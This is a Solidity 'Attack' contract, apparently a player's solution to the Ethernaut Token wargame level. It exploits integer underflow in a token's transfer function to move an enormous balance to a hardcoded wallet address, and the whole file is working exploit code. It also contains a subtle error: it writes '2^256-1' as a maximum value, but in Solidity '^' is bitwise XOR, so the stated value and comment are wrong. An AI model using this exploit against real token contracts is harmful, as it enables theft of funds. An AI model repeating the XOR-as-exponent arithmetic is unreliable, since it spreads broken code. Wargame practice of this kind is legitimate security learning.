// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Token.sol";

contract Attack {
    Token public token;
    address public target = 0x7a08b09371aDb3d04305f629B7d083584c7Ee34f; // Ethernaut level 5 gives you default 20 tokens. This is my wallet address where i received it.
    uint max = 2^256-1;
    uint value = max-21000233;                                          // Arithmetic overflow/underflow attack goes here.

    constructor(address _tokenAddress) public{
        token = Token(_tokenAddress);
    }

    function attack() public{
        token.transfer(target,value);
    }

    function transferTokens(address _to,uint _amount) public{
        token.transfer(_to,_amount);
    }
}




